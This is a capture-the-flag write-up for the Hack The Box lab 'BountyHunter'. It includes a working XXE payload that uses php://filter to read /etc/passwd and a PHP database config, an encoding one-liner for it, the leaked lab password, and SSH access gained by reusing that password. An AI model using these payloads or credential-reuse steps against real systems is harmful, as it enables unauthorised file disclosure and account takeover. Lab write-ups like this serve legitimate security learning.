HTB BountyHunter

Box: BountyHunter (Easy)
IP: 10.129.95.166
OS: Ubuntu, Apache/2.4.41
Stack: PHP, MySQL

Enumeration

Nmap revealed HTTP (80) and SSH (22). Web app has a bug bounty submission form at /log_submit.php that sends XML data to tracker_diRbPr00f314.php.

Gobuster found: db.php (200, size 0), resources/, portal.php, assets/, index.php.

The bug submission form collects Title, CWE, CVSS Score, and Reward. The frontend JavaScript builds an XML document from these fields, base64-encodes it, then URL-encodes it, and POSTs it as the `data` parameter.

Key observation: Content-Type is application/x-www-form-urlencoded, NOT application/xml. The XML is wrapped inside a form parameter.

XXE (XML External Entity Injection)

The server parses the XML from the `data` parameter without disabling external entities.

Step 1: Confirm XXE

First attempt with raw XML in the POST body failed because the app expects base64+URL-encoded XML inside a `data=` form parameter.

Also failed when using `<root><data>` tags — the app expects `<bugreport>` with `<title>`, `<cwe>`, `<cvss_score>`, `<reward>` tags matching the form fields.

Working payload structure:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
    <bugreport><title>&xxe;</title><cwe>test</cwe><cvss_score>test</cvss_score><reward>test</reward></bugreport>

Encoding chain: XML → base64 -w0 → URL-encode → send as data=<encoded>

One-liner to encode:

    echo -n '<xml payload here>' | base64 -w0 | python3 -c "import sys,urllib.parse;print('data=' + urllib.parse.quote(sys.stdin.read()))"

The base64-encoded file contents appear in the Title field of the response table.

Why php://filter? The /etc/passwd file contains characters that can break XML parsing. Wrapping it in base64 via the PHP filter gives clean output. Decode with: echo "<base64>" | base64 -d

Step 2: Read db.php

Swapped the resource to db.php:

    php://filter/convert.base64-encode/resource=db.php

Decoded output revealed:

    $dbserver = "localhost";
    $dbname = "bounty";
    $dbusername = "admin";
    $dbpassword = "m19RoAU0hP41A1sTsq6K";

Step 3: OOB attempt

Tried blind/OOB exfiltration with an external DTD hosted on Kali. The target server never made outbound HTTP requests — OOB was blocked. This confirmed the box only allows in-band XXE.

Lateral Movement

The db.php password m19RoAU0hP41A1sTsq6K was reused for SSH. Checked /etc/passwd for users with /bin/bash and found the development user.

    ssh development@10.129.95.166

Password reuse from the database config gave a shell as development.

Privilege Escalation

TODO: complete after privesc

Lessons Learned

1. Encoding matters: the app expected base64+URL-encoded XML inside a form parameter, not raw XML. Always check how the frontend sends data before crafting XXE payloads.

2. Match the XML structure: using wrong tag names (<root><data>) produced empty responses. The XML tags must match what the backend parses (found by looking at the response table headers: Title, CWE, Score, Reward).

3. PHP filter for clean output: php://filter/convert.base64-encode wraps file contents in base64, avoiding XML parsing issues with special characters.

4. OOB isn't always possible: if the target can't make outbound connections, fall back to in-band extraction or error-based techniques.

5. Credential reuse: database credentials found via XXE were reused for SSH access — always try creds across services.

6. Content-Type matters: sending application/xml when the app expects application/x-www-form-urlencoded means the server never sees your XML at all.
